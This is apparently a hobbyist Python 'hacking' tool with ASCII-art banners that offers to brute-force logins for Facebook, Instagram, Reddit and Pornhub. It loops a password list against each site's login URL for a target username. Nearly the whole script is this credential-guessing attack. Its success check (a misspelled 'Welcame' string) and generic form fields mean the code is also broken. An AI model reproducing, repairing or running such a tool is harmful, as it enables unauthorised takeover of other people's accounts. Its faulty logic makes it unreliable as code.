import requests
import sys
from time import sleep
from colorama import Fore,init
from os import system
init()

system("clear")

class name:
  print(Fore.RED+"<<<<<<<<<<"+Fore.GREEN+"D.A.R.K"+Fore.RED+">>>>>>>>>>")
  print("\n")

  print(Fore.RED+"+----------------------------------------+")
  print(Fore.YELLOW+"TelegramID = https://t.me/Firabil45")
  print("\n")
  print(Fore.YELLOW+"channel Telegram = https://t.me/DARK_MICE")
  print("\n")
  print(Fore.GREEN+"my coding "+Fore.YELLOW+": "+Fore.WHITE+"salman hacker")
  print(Fore.RED+"+----------------------------------------+")

up = input(Fore.LIGHTMAGENTA_EX+"""
[1] Facebook
[2] Instagram
[3] Redit
[4] Pornhub
[0] Exit
hacked>>> """)

if up == "1":
  system("clear")
  banr = (Fore.GREEN+f"""
  (((       ,,
                ( *)======/\====
                 )(      /  \
      __________/  )    /    \

      \___#WH1T3   /   / ""   \
        \____    _/   / (**)   \

           / \__/    (----------)
          /____|__//_ (  it's   )
               |       ( dark  )
               |       (  L'  )
               |        (____)
              _|__
  """)
  for i in banr:
    sys.stdout.write(i)
    sys.stdout.flush()
    sleep(0.009)
  print("\n")
  crc = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter TargetID "+Fore.GREEN+": "+Fore.RED)
  pas = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter passwordlist "+Fore.GREEN+": "+Fore.RED)
  
  file = open(pas,"r").read().split()
  
  for i in file:
    htttp = requests.post("https://www.facebook.com/login.php",data={"username":crc,"password":i,"sub":"submit"}).text
  
    if "Welcame" in htttp:
      print(Fore.GREEN+"[+] "+Fore.WHITE+"password Fund "+Fore.RED+": "+Fore.WHITE+i)
      break
    else:
      print(Fore.RED+"[-] "+Fore.WHITE+"password not fund "+Fore.GREEN+": "+Fore.RED+i)

if up == "2":
  system("clear")
  hack = (Fore.GREEN+"""
  .---.        .-----------                                             /     \  __  /    ------
    / /     \(  )/    -----                                               //////   ' \/ `   ---                                                 //// / // :    : ---
 // /   /  /`    '--
//          //..\\\

       ====UU====UU====
           '//||\\\`
             ''``""")
  for i in hack:
    sys.stdout.write(i)
    sys.stdout.flush()
    sleep(0.009)
  print("\n")
  list2 = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter username "+Fore.GREEN+": "+Fore.RED)
  list3 = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter passwordlist "+Fore.GREEN+": "+Fore.RED)
  
  files = open(list3,"r").read().split()

  for i in files:
    http = requests.post("https://www.instagram.com/accounts/login/",data={"username":list2,"password":i,"sub":"submit"}).text
  
    if "Welcame" in http:
      print(Fore.GREEN+"[+] "+Fore.WHITE+"password Fund "+Fore.RED+": "+Fore.WHITE+i)
      break
    else:
      print(Fore.RED+"[-] "+Fore.WHITE+"password not fund "+Fore.GREEN+": "+Fore.RED+i)


if up == "3":
  system("clear")
  
  bnr = (Fore.GREEN+f"""
  ,-.
        _,---.__            /'|`\            __,---,_                       ,-'     \`   `-.____,-'  |  `-.____,-'     /     `-.
   ,'         |            ~'\      /`~            |         `.
  /      __// ,  ,           `. ,'             ,  ,\__      \
 |    ,-'      `-.__   ,        |          ,    __,-'   `-.    |        |   /           /\_     ,              ,      _/\        \    |
 \  |            \ \`-._ _ \        / ___,-'/ /          |   /           \  \           | `._ @`\   |  //' @ ,'  |            /  /
   `-.\         /'     _ `---'' , . ``---' _  ` \         /,-'               ``       /       \    ,='/ \`=.    /     \       ''
              |__   /|\_,--.,-.--,--._/|\   __|                                      /  `./     \`\ |  |  | /,//'   \,'  \
             /   /       ||--+--|--+-/-||     \   \                                |   |       /'\_\_\ | /_/_/`\      |   |
             \   \__, \_     `~'     _/ .__/   /                                     `-._,-'   `-._       _,-'   `-._,-'
  """)
  for b in bnr:
    sys.stdout.write(b)
    sys.stdout.flush()
    sleep(0.009)
  print("\n")
  user = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter username "+Fore.GREEN+": "+Fore.RED)
  paslist = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter passwordlist "+Fore.GREEN+": "+Fore.RED)

  name = open(paslist,"r").read().split()

  for i in name:
    htt = requests.post("https://www.reddit.com/login/",data={"username":user,"password":i,"sub":"submit"}).text
  
    if "Welcame" in htt:
      print(Fore.GREEN+"[+] "+Fore.WHITE+"password Fund "+Fore.RED+": "+Fore.WHITE+i)
      break
    else:
      print(Fore.RED+"[-] "+Fore.WHITE+"password not fund "+Fore.GREEN+": "+Fore.RED+i)

if up == "4":
  system("clear")
  b = (Fore.GREEN+"""
  __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
dark -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   HACK v3.3      @#%,.@
                @#%,.@              @#%,.@
                  @#%,.@          @#%,.@
                     @#%,.@      @#%,.@
                       @#%.,@  @#%,.@
  """)
  for i in b:
    sys.stdout.write(i)
    sys.stdout.flush()
    sleep(0.009)
  print("\n")
  porn = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter username Porn "+Fore.GREEN+": "+Fore.RED)
  pasw = input(Fore.GREEN+"["+Fore.RED+"**"+Fore.GREEN+"]"+" Enter passwordlist "+Fore.GREEN+": "+Fore.RED)
  
  acc = open(pasw,"r").read().split()
  
  for i in acc:
    https = requests.post("https://www.pornhub.com/login",data={"username":porn,"password":i,"sub":"submit"}).text
  
    if "Welcame" in https:
        print(Fore.GREEN+"[+] "+Fore.WHITE+"password Fund "+Fore.RED+": "+Fore.WHITE+i)
        break
    else:
        print(Fore.RED+"[-] "+Fore.WHITE+"password not fund "+Fore.GREEN+": "+Fore.RED+i)

if up == "0":
  exit()